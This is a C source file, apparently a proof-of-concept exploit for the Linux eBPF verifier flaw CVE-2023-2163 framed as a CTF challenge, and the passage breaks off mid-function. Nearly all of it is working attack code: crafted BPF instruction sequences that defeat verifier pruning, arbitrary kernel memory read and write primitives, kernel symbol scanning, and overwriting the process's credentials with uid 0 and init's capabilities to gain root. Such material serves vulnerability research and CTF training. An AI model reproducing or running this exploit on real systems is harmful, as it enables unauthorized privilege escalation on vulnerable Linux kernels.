/*
 * CVE-2023-2163 PoC - CTF Challenge Mode
 *
 * Vulnerability: eBPF verifier pruning logic error
 *
 * The BPF verifier's state pruning algorithm has a defect when judging
 * whether to skip equivalent state verification, allowing crafted BPF
 * programs to bypass security checks. This achieves:
 * 1. Arbitrary kernel memory read via corrupted stack pointer
 * 2. Arbitrary kernel memory write via corrupted pointer + BPF store
 * 3. Privilege escalation by overwriting task cred structure
 *
 * Based on: https://github.com/google/security-research/tree/master/pocs/linux/cve-2023-2163
 *
 * CTF Modes: write_root_file, read_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - No system file modification
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <linux/bpf.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>

/* ========================================================================
 * BPF instruction macros (from original exploit_prims.h)
 * ======================================================================== */

#define BPF_ALU_IMM(OP, DST, IMM, INS_CLASS) \
    ((struct bpf_insn){.code = INS_CLASS | BPF_OP(OP) | BPF_K, \
     .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_ALU_REG(OP, DST, SRC, INS_CLASS) \
    ((struct bpf_insn){.code = INS_CLASS | BPF_OP(OP) | BPF_X, \
     .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})

#define BPF_EXIT_INSN_() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT, \
     .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

#define BPF_JMP_REG(OP, DST, SRC, OFF, INS_CLASS) \
    ((struct bpf_insn){.code = INS_CLASS | BPF_OP(OP) | BPF_X, \
     .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#define BPF_JMP_IMM_(OP, DST, IMM, OFF, INS_CLASS) \
    ((struct bpf_insn){.code = INS_CLASS | BPF_OP(OP) | BPF_K, \
     .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_CALL_FUNC(FUNCTION_NUMBER) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_CALL, \
     .dst_reg = 0, .src_reg = 0, .off = 0, .imm = FUNCTION_NUMBER})

#define BPF_LD_MAP_FD(DST, MAP_FD) \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, \
     .dst_reg = DST, .src_reg = 0x01, .off = 0, .imm = (__u32)(MAP_FD)}), \
    ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, \
     .off = 0, .imm = ((__u64)(MAP_FD)) >> 32})

#define BPF_MEM_OPERATION(INS_CLASS, SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = INS_CLASS | BPF_SIZE(SIZE) | BPF_MEM, \
     .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#ifndef BPF_REG_0
#define BPF_REG_0 0
#define BPF_REG_1 1
#define BPF_REG_2 2
#define BPF_REG_3 3
#define BPF_REG_4 4
#define BPF_REG_5 5
#define BPF_REG_6 6
#define BPF_REG_7 7
#define BPF_REG_8 8
#define BPF_REG_9 9
#define BPF_REG_10 10
#endif

#ifndef BPF_FUNC_map_lookup_elem
#define BPF_FUNC_map_lookup_elem 1
#endif
#ifndef BPF_FUNC_skb_load_bytes_relative
#define BPF_FUNC_skb_load_bytes_relative 68
#endif

#ifndef __NR_bpf
#if defined(__x86_64__)
#define __NR_bpf 321
#elif defined(__aarch64__)
#define __NR_bpf 280
#else
#define __NR_bpf 321
#endif
#endif

/*
 * CORRUPT_R6: Verifier pruning bypass trigger sequence.
 * These instructions create a state where the verifier incorrectly prunes
 * a branch, believing register r6 has a known safe value when it doesn't.
 */
#define CORRUPT_R6 \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_6, 149420059, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_7, 3982203280U, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_8, 67, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_9, 1042510562, BPF_ALU64), \
    BPF_JMP_REG(BPF_JGT, BPF_REG_7, BPF_REG_6, 1, BPF_JMP), \
    BPF_ALU_IMM(BPF_MUL, BPF_REG_7, 1, BPF_ALU), \
    BPF_JMP_REG(BPF_JEQ, BPF_REG_6, BPF_REG_9, 1, BPF_JMP), \
    BPF_ALU_IMM(BPF_ADD, BPF_REG_6, 0, BPF_ALU), \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_6, 2613857455U, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOD, BPF_REG_6, 698566326, BPF_ALU64), \
    BPF_ALU_REG(BPF_RSH, BPF_REG_7, BPF_REG_9, BPF_ALU), \
    BPF_ALU_REG(BPF_RSH, BPF_REG_9, BPF_REG_7, BPF_ALU64), \
    BPF_ALU_REG(BPF_MOV, BPF_REG_8, BPF_REG_7, BPF_ALU64), \
    BPF_JMP_REG(BPF_JSET, BPF_REG_8, BPF_REG_9, 4, BPF_JMP), \
    BPF_ALU_IMM(BPF_ADD, BPF_REG_9, 635122136, BPF_ALU), \
    BPF_ALU_IMM(BPF_LSH, BPF_REG_9, 46, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MUL, BPF_REG_8, 1, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MUL, BPF_REG_8, 1, BPF_ALU64), \
    BPF_JMP_REG(BPF_JNE, BPF_REG_6, BPF_REG_9, 2, BPF_JMP), \
    BPF_ALU_IMM(BPF_NEG, BPF_REG_6, BPF_REG_0, BPF_ALU), \
    BPF_ALU_IMM(BPF_LSH, BPF_REG_9, BPF_REG_7, BPF_ALU), \
    BPF_JMP_REG(BPF_JLE, BPF_REG_6, BPF_REG_9, 2, BPF_JMP), \
    BPF_ALU_IMM(BPF_MOD, BPF_REG_6, 3021791800U, BPF_ALU), \
    BPF_ALU_IMM(BPF_RSH, BPF_REG_6, 40, BPF_ALU64), \
    BPF_ALU_IMM(BPF_RSH, BPF_REG_6, 28, BPF_ALU)

/*
 * CORRUPT_STACK_PTR: Uses skb_load_bytes_relative to overwrite a verified
 * stack pointer with attacker-controlled data from the packet.
 *
 * 1. Store random scalar to stack[-8]
 * 2. Store (stack pointer - 8) to stack[-16]
 * 3. Call skb_load_bytes_relative - overwrites stack[-16] with packet data
 * 4. Load stack[-16] to R1 - verifier thinks we have ptr to stack[-8]
 *    but we actually have an arbitrary kernel pointer from packet data
 */
#define CORRUPT_STACK_PTR \
    CORRUPT_R6, \
    BPF_ALU_REG(BPF_MOV, BPF_REG_9, BPF_REG_1, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_1, 0xCAFE, BPF_ALU64), \
    BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_10, BPF_REG_1, -8), \
    BPF_ALU_REG(BPF_MOV, BPF_REG_2, BPF_REG_10, BPF_ALU64), \
    BPF_ALU_IMM(BPF_ADD, BPF_REG_2, -8, BPF_ALU64), \
    BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_10, BPF_REG_2, -16), \
    BPF_ALU_REG(BPF_MOV, BPF_REG_1, BPF_REG_9, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_2, 0, BPF_ALU64), \
    BPF_ALU_REG(BPF_MOV, BPF_REG_3, BPF_REG_10, BPF_ALU64), \
    BPF_ALU_IMM(BPF_ADD, BPF_REG_3, -24, BPF_ALU64), \
    BPF_ALU_REG(BPF_MOV, BPF_REG_4, BPF_REG_6, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MUL, BPF_REG_4, 8, BPF_ALU64), \
    BPF_ALU_IMM(BPF_ADD, BPF_REG_4, 8, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_5, 1, BPF_ALU64), \
    BPF_CALL_FUNC(BPF_FUNC_skb_load_bytes_relative), \
    BPF_MEM_OPERATION(BPF_LDX, BPF_DW, BPF_REG_1, BPF_REG_10, -16)

/* ========================================================================
 * Kernel structure definitions (for radix tree / IDR traversal)
 * ======================================================================== */

#define XA_CHUNK_SHIFT 0x6
#define XA_CHUNK_SIZE  0x40

#define RADIX_TREE_MAP_SHIFT   XA_CHUNK_SHIFT
#define RADIX_TREE_MAP_SIZE    (1UL << RADIX_TREE_MAP_SHIFT)
#define RADIX_TREE_MAP_MASK    (RADIX_TREE_MAP_SIZE - 1)
#define RADIX_TREE_ENTRY_MASK  3UL
#define RADIX_TREE_INTERNAL_NODE 2UL

static inline void *xa_mk_internal(unsigned long v) {
    return (void *)((v << 2) | 2);
}
#define XA_RETRY_ENTRY xa_mk_internal(256)
#define RADIX_TREE_RETRY XA_RETRY_ENTRY

struct xarray {
    int32_t xa_lock;
    int32_t xa_flags;
    void *xa_head;
};

struct xa_node {
    unsigned char shift;
    unsigned char offset;
    unsigned char count;
    unsigned char nr_values;
    struct xa_node *parent;
    struct xarray *array;
    char filler[0x10];
    void *slots[XA_CHUNK_SIZE];
};

#define radix_tree_root xarray
#define radix_tree_node xa_node

struct idr {
    struct radix_tree_root idr_rt;
    unsigned int idr_base;
    unsigned int idr_next;
};

struct pid_namespace {
    struct idr idr;
};

/* ========================================================================
 * Exploit context
 * ======================================================================== */

typedef struct {
    int map_fd;
    int map_size;
    int read_fd;

    void *kernel_memory;
    int kernel_page_size;
    int kernel_allocated_pages;

    uint64_t init_pid_fs;
    uint64_t init_pid_cap_inh;
    uint64_t init_pid_cap_perm;
    uint64_t init_pid_cap_eff;

    uint64_t map_leak;
    uint64_t ops_leak;
    uint64_t init_proc_ns_kstrtab;
    uint64_t init_proc_ns_addr;
    uint64_t task_addr;
    uint64_t creds_addr;
} exploit_context;

/* ========================================================================
 * BPF primitive functions
 * ======================================================================== */

static int bpf_create_map(unsigned int max_entries) {
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = sizeof(uint32_t),
        .value_size = sizeof(uint64_t),
        .max_entries = max_entries
    };
    int ret = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    poc_log_syscall("bpf(BPF_MAP_CREATE)", (long)ret, errno);
    return ret;
}

static int load_prog(struct bpf_insn *instructions, size_t insn_count) {
    unsigned char log_buf[65536] = {};
    union bpf_attr attr = {};
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (uint64_t)instructions;
    attr.insn_cnt = insn_count;
    attr.license = (uint64_t)"GPL";
    attr.log_size = sizeof(log_buf);
    attr.log_buf = (uint64_t)log_buf;
    attr.log_level = 1;

    int prog_fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    if (prog_fd < 0) {
        poc_log("BPF prog load failed: %s", strerror(errno));
    }
    return prog_fd;
}

static int get_map_contents(exploit_context *ctx, uint64_t *contents) {
    for (uint64_t key = 0; key < (uint64_t)ctx->map_size; key++) {
        uint64_t element = 0;
        union bpf_attr lookup_map = {
            .map_fd = (uint32_t)ctx->map_fd,
            .key = (uint64_t)&key,
            .value = (uint64_t)&element
        };
        int err = syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &lookup_map, sizeof(lookup_map));
        if (err < 0) return -1;
        contents[key] = element;
    }
    return 0;
}

static int bpf_prog_skb_run(int prog_fd, const void *data, size_t size) {
    int err, socks[2] = {};
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) != 0) return errno;

    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) != 0) {
        err = errno;
        close(socks[0]); close(socks[1]);
        return err;
    }

    if (write(socks[1], data, size) != (ssize_t)size) {
        err = -1;
        close(socks[0]); close(socks[1]);
        return err;
    }

    close(socks[0]); close(socks[1]);
    return 0;
}

static int execute_bpf_program(exploit_context *ctx, int prog_fd,
                               uint64_t *map_contents, void *data, int data_len) {
    if (bpf_prog_skb_run(prog_fd, data, data_len) != 0) return -1;
    if (map_contents != NULL) {
        if (get_map_contents(ctx, map_contents) != 0) return -1;
    }
    return 0;
}

/* ========================================================================
 * Kernel read/write primitives via BPF verifier bypass
 * ======================================================================== */

static int read_from_address(exploit_context *ctx, uint64_t target_address, uint64_t *value) {
    if (ctx->read_fd < 0) return -1;

    uint64_t data[2];
    data[0] = 0xAAAAAAAAAAAAAAAAULL;
    data[1] = target_address;
    if (execute_bpf_program(ctx, ctx->read_fd, NULL, data, sizeof(data)) != 0) return -1;

    uint64_t map_contents[4];
    if (get_map_contents(ctx, map_contents) != 0) return -1;
    *value = map_contents[0];
    return 0;
}

static int write_to_address(exploit_context *ctx, uint64_t target_address, uint64_t value) {
    if (ctx->map_fd < 0) return -1;

    uint32_t lower_half = (uint32_t)(value & 0xFFFFFFFF);
    uint32_t upper_half = (uint32_t)((value >> 32) & 0xFFFFFFFF);
    if ((int32_t)lower_half < 0) upper_half += 1;

    struct bpf_insn instrs[] = {
        CORRUPT_STACK_PTR,
        BPF_ALU_IMM(BPF_MOV, BPF_REG_2, upper_half, BPF_ALU64),
        BPF_ALU_IMM(BPF_LSH, BPF_REG_2, 32, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_2, lower_half, BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_1, BPF_REG_2, 0),
        BPF_ALU_IMM(BPF_MOV, BPF_REG_0, BPF_REG_0, BPF_ALU64),
        BPF_EXIT_INSN_()
    };

    int prog_fd = load_prog(instrs, sizeof(instrs) / sizeof(instrs[0]));
    if (prog_fd < 0) return -1;

    uint64_t data[2];
    data[0] = 0xAAAAAAAAAAAAAAAAULL;
    data[1] = target_address;
    int ret = execute_bpf_program(ctx, prog_fd, NULL, data, sizeof(data));
    close(prog_fd);
    return ret;
}

static int kernel_read_bytes(exploit_context *ctx, uint64_t target_address,
                             void *destination, uint64_t size) {
    uint64_t read_amount = (size / sizeof(uint64_t));
    if (size % 8 != 0) read_amount++;

    uint64_t *values = (uint64_t *)destination;
    for (uint64_t i = 0; i < read_amount; i++, target_address += 8) {
        uint64_t val;
        if (read_from_address(ctx, target_address, &val) != 0) return -1;
        values[i] = val;
    }
    return 0;
}

/* ========================================================================
 * Exploit core: Leak BPF map pointer & prepare read primitive
 * ======================================================================== */

static int prepare_read(exploit_context *ctx) {
    if (ctx->map_fd < 0) return -1;

    struct bpf_insn instrs[] = {
        CORRUPT_STACK_PTR,
        BPF_MEM_OPERATION(BPF_LDX, BPF_DW, BPF_REG_8, BPF_REG_1, 0),

        /* Load map element 0 ptr - store read value there */
        BPF_ALU_IMM(BPF_MOV, BPF_REG_0, 0, BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_10, BPF_REG_0, -32),
        BPF_LD_MAP_FD(BPF_REG_4, ctx->map_fd),
        BPF_ALU_REG(BPF_MOV, BPF_REG_1, BPF_REG_4, BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, BPF_REG_2, BPF_REG_10, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_2, -28, BPF_ALU64),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM_(BPF_JNE, BPF_REG_0, BPF_REG_0, BPF_REG_1, BPF_JMP),
        BPF_EXIT_INSN_(),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_0, BPF_REG_8, 0),
        BPF_ALU_IMM(BPF_MOV, BPF_REG_0, BPF_REG_0, BPF_ALU64),
        BPF_EXIT_INSN_()
    };

    int prog_fd = load_prog(instrs, sizeof(instrs) / sizeof(instrs[0]));
    if (prog_fd < 0) return -1;

    ctx->read_fd = prog_fd;
    return 0;
}

static int leak_map_ptr(exploit_context *ctx) {
    if (ctx->map_fd < 0) return -1;

    struct bpf_insn instrs[] = {
        CORRUPT_R6,
        BPF_ALU_REG(BPF_MOV, BPF_REG_9, BPF_REG_1, BPF_ALU64),

        /* Store magic numbers for identification */
        BPF_ALU_IMM(BPF_MOV, BPF_REG_1, 0x0, BPF_ALU64),
        BPF_ALU_IMM(BPF_LSH, BPF_REG_1, 32, BPF_ALU64),
        BPF_ALU_IMM(BPF_MOV, BPF_REG_1, 0xCAFE, BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_10, BPF_REG_1, -8),

        BPF_ALU_REG(BPF_MOV, BPF_REG_2, BPF_REG_10, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_2, -8, BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_10, BPF_REG_2, -32),

        /* Second magic */
        BPF_ALU_IMM(BPF_MOV, BPF_REG_1, 0x0, BPF_ALU64),
        BPF_ALU_IMM(BPF_LSH, BPF_REG_1, 32, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_1, 0xBACA, BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_10, BPF_REG_1, -16),

        /* Load map fd ptr */
        BPF_LD_MAP_FD(BPF_REG_4, ctx->map_fd),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_10, BPF_REG_4, -24),
        BPF_ALU_REG(BPF_MOV, BPF_REG_7, BPF_REG_4, BPF_ALU64),

        /* map_lookup_elem(map, &key=0) */
        BPF_ALU_IMM(BPF_MOV, BPF_REG_0, 0, BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_10, BPF_REG_0, -40),
        BPF_ALU_REG(BPF_MOV, BPF_REG_1, BPF_REG_4, BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, BPF_REG_2, BPF_REG_10, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_2, -36, BPF_ALU64),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM_(BPF_JNE, BPF_REG_0, BPF_REG_0, BPF_REG_1, BPF_JMP),
        BPF_EXIT_INSN_(),
        BPF_ALU_REG(BPF_MOV, BPF_REG_8, BPF_REG_0, BPF_ALU64),

        /* Corrupt stack ptr with packet data */
        BPF_ALU_REG(BPF_MOV, BPF_REG_1, BPF_REG_9, BPF_ALU64),
        BPF_ALU_IMM(BPF_MOV, BPF_REG_2, 0, BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, BPF_REG_3, BPF_REG_10, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_3, -40, BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, BPF_REG_4, BPF_REG_6, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_4, 8, BPF_ALU64),
        BPF_ALU_IMM(BPF_MOV, BPF_REG_5, 1, BPF_ALU64),
        BPF_CALL_FUNC(BPF_FUNC_skb_load_bytes_relative),

        /* Second map lookup with key=1 */
        BPF_ALU_IMM(BPF_MOV, BPF_REG_0, 1, BPF_ALU),
        BPF_MEM_OPERATION(BPF_STX, BPF_W, BPF_REG_10, BPF_REG_0, -36),
        BPF_ALU_REG(BPF_MOV, BPF_REG_1, BPF_REG_7, BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, BPF_REG_2, BPF_REG_10, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_2, -36, BPF_ALU64),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM_(BPF_JNE, BPF_REG_0, BPF_REG_0, BPF_REG_1, BPF_JMP),
        BPF_EXIT_INSN_(),

        /* Copy leaked values to map */
        BPF_MEM_OPERATION(BPF_LDX, BPF_DW, BPF_REG_1, BPF_REG_10, -32),
        BPF_MEM_OPERATION(BPF_LDX, BPF_DW, BPF_REG_2, BPF_REG_1, 0),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_0, BPF_REG_2, 0),

        BPF_MEM_OPERATION(BPF_LDX, BPF_DW, BPF_REG_2, BPF_REG_1, -8),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, BPF_REG_8, BPF_REG_2, 0),

        BPF_ALU_IMM(BPF_MOV, BPF_REG_0, BPF_REG_0, BPF_ALU64),
        BPF_EXIT_INSN_()
    };

    int prog_fd = load_prog(instrs, sizeof(instrs) / sizeof(instrs[0]));
    if (prog_fd < 0) return -1;

    int max_attempts = 256 * 256;
    uint64_t map_contents[4];
    memset(map_contents, 0, sizeof(map_contents));

    int offset = 0;
    while (max_attempts-- > 0) {
        offset += 8;
        offset %= 256;

        uint8_t data[100];
        memset(data, offset, sizeof(data));
        if (execute_bpf_program(ctx, prog_fd, map_contents, data, 100) != 0) {
            close(prog_fd);
            return -1;
        }
        if (map_contents[1] == 0xbaca) {
            ctx->map_leak = map_contents[0];
            break;
        }
    }

    close(prog_fd);
    if (max_attempts <= 0) return -1;
    return 0;
}

/* ========================================================================
 * Kernel structure traversal helpers
 * ======================================================================== */

static inline int radix_tree_is_internal(void *ptr) {
    return ((unsigned long)ptr & RADIX_TREE_ENTRY_MASK) == RADIX_TREE_INTERNAL_NODE;
}

static inline struct xa_node *entry_to_node(void *ptr) {
    return (void *)((unsigned long)ptr & ~RADIX_TREE_INTERNAL_NODE);
}

static void *idr_find_ctx(exploit_context *ctx, uint64_t idr_addr, unsigned long id) {
    /* Read idr structure */
    struct idr idr_data;
    if (kernel_read_bytes(ctx, idr_addr, &idr_data, sizeof(idr_data)) != 0) return NULL;

    /* radix tree lookup */
    unsigned long index = id - idr_data.idr_base;
    struct xarray xa;
    if (kernel_read_bytes(ctx, idr_addr, &xa, sizeof(xa)) != 0) return NULL;

    void *node = xa.xa_head;
    if (!node) return NULL;

    if (!radix_tree_is_internal(node)) {
        return (index == 0) ? node : NULL;
    }

    struct xa_node node_data;
    node = entry_to_node(node);

    if (kernel_read_bytes(ctx, (uint64_t)node, &node_data, sizeof(node_data)) != 0)
        return NULL;

    unsigned long maxindex = (RADIX_TREE_MAP_SIZE << node_data.shift) - 1;
    if (index > maxindex) return NULL;

    while (1) {
        unsigned int off = (index >> node_data.shift) & RADIX_TREE_MAP_MASK;
        void *entry = node_data.slots[off];

        if (!radix_tree_is_internal(entry)) return entry;
        if (entry == RADIX_TREE_RETRY) return NULL;

        node = entry_to_node(entry);
        if (kernel_read_bytes(ctx, (uint64_t)node, &node_data, sizeof(node_data)) != 0)
            return NULL;
        if (node_data.shift == 0) {
            off = index & RADIX_TREE_MAP_MASK;
            return node_data.slots[off];
        }
    }
}

/* ========================================================================
 * Main exploit flow: find current process, overwrite credentials
 * ======================================================================== */

static int find_init_pid_ns_string(exploit_context *ctx) {
    /* Search kernel memory for "init_pid" string to locate init_pid_ns */
    char needle[] = "init_pid";
    int needle_len = strlen(needle);
    uint64_t page_buf[512]; /* 4096 / 8 */

    for (uint64_t i = 0; i < 0x2000000; i += ctx->kernel_page_size) {
        if (kernel_read_bytes(ctx, ctx->ops_leak + i, page_buf, ctx->kernel_page_size) != 0)
            return -1;

        char *page = (char *)page_buf;
        for (int j = 0; j < ctx->kernel_page_size - needle_len; j++) {
            if (strncmp(needle, page + j, needle_len) == 0) {
                ctx->init_proc_ns_kstrtab = ctx->ops_leak + i + j;
                poc_log("Found init_pid_ns string at 0x%lx", ctx->init_proc_ns_kstrtab);
                return 0;
            }
        }
    }
    return -1;
}

static int find_init_pid_ns_addr(exploit_context *ctx) {
    /* Scan already-loaded kernel pages for ksymtab reference to init_pid_ns */
    uint64_t kstrtab = ctx->init_proc_ns_kstrtab;
    uint64_t scan_size = 0x2000000;
    uint64_t page_buf[512];

    for (uint64_t i = 0; i < scan_size; i += ctx->kernel_page_size) {
        uint64_t base = ctx->ops_leak + i;
        if (kernel_read_bytes(ctx, base, page_buf, ctx->kernel_page_size) != 0)
            continue;

        char *page = (char *)page_buf;
        for (int j = 0; j < ctx->kernel_page_size - 4; j++) {
            uint32_t offset_val = *(uint32_t *)(page + j);
            if (kstrtab == (base + j) + offset_val) {
                if (j >= 4) {
                    uint32_t value_offset = *(uint32_t *)(page + j - 4);
                    ctx->init_proc_ns_addr = (base + j - 4) + value_offset;
                    poc_log("Found init_pid_ns at 0x%lx", ctx->init_proc_ns_addr);
                    return 0;
                }
            }
        }
    }
    return -1;
}

static int find_and_escalate(exploit_context *ctx) {
    /* Set process name for identification */
    const char prog_name[] = "seckernel";
    prctl(PR_SET_NAME, prog_name, 0, 0, 0);

    /*
     * Kernel structure offsets (Linux 6.1-6.5 typical):
     * task_struct->tasks (list_head): 0x5c8
     * task_struct->cred: 0x720
     * task_struct->comm: 0x730
     * task_struct->fs: 0x760
     * cred->uid/gid: offset 0x4-0x1c
     * cred->cap_inheritable: 0x28
     */
    uint64_t task_list_offset = 0x5c8;
    uint64_t task_cred_offset = 0x720;
    uint64_t task_comm_offset = 0x730;
    uint64_t task_fs_offset = 0x760;
    uint64_t cred_cap_inh_offset = 0x28;
    uint64_t pid_tasks_offset = 0x10;

    /* First find init (pid 1) to get reference values */
    void *pid1_struct = idr_find_ctx(ctx, ctx->init_proc_ns_addr, 1);
    if (!pid1_struct) {
        poc_log("Could not find pid 1 in namespace");
        return -1;
    }

    uint64_t first;
    if (read_from_address(ctx, (uint64_t)pid1_struct + pid_tasks_offset, &first) != 0)
        return -1;

    uint64_t init_task = first - task_list_offset;

    /* Read init's fs_struct and capabilities for later */
    if (read_from_address(ctx, init_task + task_fs_offset, &ctx->init_pid_fs) != 0)
        return -1;

    uint64_t init_cred;
    if (read_from_address(ctx, init_task + task_cred_offset, &init_cred) != 0)
        return -1;

    read_from_address(ctx, init_cred + cred_cap_inh_offset, &ctx->init_pid_cap_inh);
    read_from_address(ctx, init_cred + cred_cap_inh_offset + 8, &ctx->init_pid_cap_perm);
    read_from_address(ctx, init_cred + cred_cap_inh_offset + 16, &ctx->init_pid_cap_eff);

    poc_log("init fs=0x%lx cap_inh=0x%lx", ctx->init_pid_fs, ctx->init_pid_cap_inh);

    /* Now find our process */
    pid_t mypid = getpid();
    void *my_pid_struct = idr_find_ctx(ctx, ctx->init_proc_ns_addr, mypid);
    if (!my_pid_struct) {
        poc_log("Could not find our pid %d", mypid);
        return -1;
    }

    if (read_from_address(ctx, (uint64_t)my_pid_struct + pid_tasks_offset, &first) != 0)
        return -1;

    ctx->task_addr = first - task_list_offset;
    poc_log("Our task_struct at 0x%lx", ctx->task_addr);

    /* Verify by reading comm */
    char comm[16] = {};
    kernel_read_bytes(ctx, ctx->task_addr + task_comm_offset, comm, 16);
    poc_log("Task comm: %s", comm);

    /* Read our cred pointer */
    if (read_from_address(ctx, ctx->task_addr + task_cred_offset, &ctx->creds_addr) != 0)
        return -1;
    poc_log("Our cred at 0x%lx", ctx->creds_addr);

    /* Overwrite cred: set uid/gid to 0 */
    if (write_to_address(ctx, ctx->creds_addr + 0x4, 0) != 0) {
        poc_log("Failed to patch uid");
        return -1;
    }
    if (write_to_address(ctx, ctx->creds_addr + 0x8, 0) != 0) {
        poc_log("Failed to patch gid");
        return -1;
    }
    /* Copy init's fs_struct pointer */
    if (write_to_address(ctx, ctx->task_addr + task_fs_offset, ctx->init_pid_fs) != 0) {
        poc_log("Failed to patch fs");
        return -1;
    }
    /* Copy init's capabilities */
    write_to_address(ctx, ctx->creds_addr + cred_cap_inh_offset, ctx->init_pid_cap_inh);
    write_to_address(ctx, ctx->creds_addr + cred_cap_inh_offset + 8, ctx->init_pid_cap_perm);
    write_to_address(ctx, ctx->creds_addr + cred_cap_inh_offset + 16, ctx->init_pid_cap_eff);

    poc_log("Credentials patched, uid=%d euid=%d", getuid(), geteuid());
    return 0;
}

/* ========================================================================
 * Full exploit chain
 * ======================================================================== */

static int run_exploit(exploit_context *ctx) {
    poc_log("Step 1: Creating BPF map...");
    ctx->map_fd = bpf_create_map(ctx->map_size);
    if (ctx->map_fd < 0) {
        poc_log("Cannot create BPF map: %s", strerror(errno));
        return -1;
    }

    poc_log("Step 2: Leaking map pointer via verifier bypass...");
    if (leak_map_ptr(ctx) != 0) {
        poc_log("Failed to leak map pointer");
        close(ctx->map_fd);
        return -1;
    }
    poc_log("map_leak = 0x%lx", ctx->map_leak);

    poc_log("Step 3: Preparing arbitrary read primitive...");
    if (prepare_read(ctx) != 0) {
        poc_log("Failed to prepare read primitive");
        close(ctx->map_fd);
        return -1;
    }

    poc_log("Step 4: Leaking kernel base via map_ops...");
    if (read_from_address(ctx, ctx->map_leak, &ctx->ops_leak) != 0) {
        poc_log("Failed to leak map_ops");
        close(ctx->read_fd);
        close(ctx->map_fd);
        return -1;
    }
    poc_log("ops_leak = 0x%lx", ctx->ops_leak);

    poc_log("Step 5: Finding init_pid_ns...");
    if (find_init_pid_ns_string(ctx) != 0) {
        poc_log("Failed to find init_pid_ns string");
        close(ctx->read_fd);
        close(ctx->map_fd);
        return -1;
    }

    if (find_init_pid_ns_addr(ctx) != 0) {
        poc_log("Failed to find init_pid_ns address");
        close(ctx->read_fd);
        close(ctx->map_fd);
        return -1;
    }

    poc_log("Step 6: Finding current process and escalating privileges...");
    if (find_and_escalate(ctx) != 0) {
        poc_log("Failed to escalate privileges");
        close(ctx->read_fd);
        close(ctx->map_fd);
        return -1;
    }

    close(ctx->read_fd);
    close(ctx->map_fd);
    return 0;
}

/* ========================================================================
 * CTF mode handlers
 * ======================================================================== */

static int check_bpf_available(void) {
    uid_t euid = geteuid();
    if (euid == 0) {
